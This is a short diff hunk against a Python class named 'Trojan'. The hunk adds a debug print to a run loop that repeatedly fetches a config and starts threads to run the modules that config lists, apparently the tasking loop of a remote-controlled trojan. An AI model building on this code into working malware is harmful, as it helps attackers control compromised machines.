@@ -57,6 +57,7 @@ class Trojan:
     def run(self):
         while True:
             config = self.get_config()
+            print(f"[*] Running tasks: {config}")
             for task in config:
                 thread = threading.Thread(target = self.module_runner, args = (task['modules'],))
                 thread.start()
